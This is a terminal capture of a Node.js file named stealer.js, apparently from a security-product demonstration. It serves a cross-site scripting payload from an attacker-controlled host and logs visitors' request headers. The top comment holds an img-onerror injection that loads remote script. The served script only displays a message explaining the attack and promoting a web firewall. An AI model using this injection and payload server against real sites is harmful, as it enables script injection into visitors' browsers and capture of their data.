root@kali:/home/ec2-user/node_launcher# cat stealer.js
//
// <img src=1 onerror="s=document.createElement('script');s.src='//kali.brett1.com/static/evil.js';document.body.appendChild(s);"
//
const express = require('express')
const app = express()
var fs = require('fs');
var http = require('http');
var https = require('https');
var privateKey  = fs.readFileSync('key.pem', 'utf8');
var certificate = fs.readFileSync('cert.pem', 'utf8');
var credentials = {key: privateKey, cert: certificate};


var shell = require('shelljs');
const util = require('util');
const promised_child_exec = util.promisify(require('child_process').exec);
//const promised_child_exec = util.promisify(require('child_process').exec);
async function lsWithGrep() {
  try {
      const { stdout, stderr } = await promised_child_exec('ls | grep walp');
      console.log('stdout:', stdout);
      console.log('stderr:', stderr);
  } catch (err) {
     console.error(err);
  };
};
//lsWithGrep();

app.get('/', function (req, res) {
  console.log(JSON.stringify(req.headers));
  console.log(req.params);
  console.log(req.query);
  res.send("<script>alert('hello from kali!');</script>")
  res.end
})

app.get('/bogus.php', function (req, res) {
  console.log(JSON.stringify(req.headers));
  console.log(req.params);
  console.log(req.query);
  res.send('hello world')
  res.end
})


app.get('/static/evil.js', function (req, res) {
  console.log(JSON.stringify(req.headers));
  console.log(req.params);
  console.log(req.query);
  res.send("dB = document.body; dB.innerHTML = \"<div id='overlay' style='position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; border: 0; margin: 0; background-color: black; color:white;'><div id='msg' style='margin: 0 auto; text-align: center; margin-top: 140px; font-size: 16px; font-family: monospace; color: white;'></div></div>\"; document.getElementById('msg').innerHTML = 'Hello from John, Simon, and Gabe...<br>This javascript injection/xss lives on kali.brett1.com,<br> but your browser has gone to that site, downloaded it, and executed the javascript! How???<br>View the page source in developer tools to see what happend...<br> PS Use the Barracuda WAF to stop things like this from happening, OWASP Top 10 is no joke!';")
  //res.send("dB = document.body; dBs = dB.style; sT=setTimeout; function showStatic() { dB.innerHTML = \"<div id='overlay' style='position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; border: 0; margin: 0; background-color: black;'><div id='msg' style='margin: 0 auto; text-align: center; margin-top: 140px; font-size: 16px; font-family: monospace; color: white;'></div></div>\"; dBs.positionLeft = 0; dBs.positionTop = 0; dBs.marginLeft = 0; dBs.marginTop = 0; dBs.opacity = 0; document.getElementById('msg').innerHTML = 'Hello from Kali...';}; showStatic(); ")
  res.end
})

var httpServer = http.createServer(app);
var httpsServer = https.createServer(credentials, app);

httpServer.listen(80);
httpsServer.listen(443);
root@kali:/home/ec2-user/node_launcher#
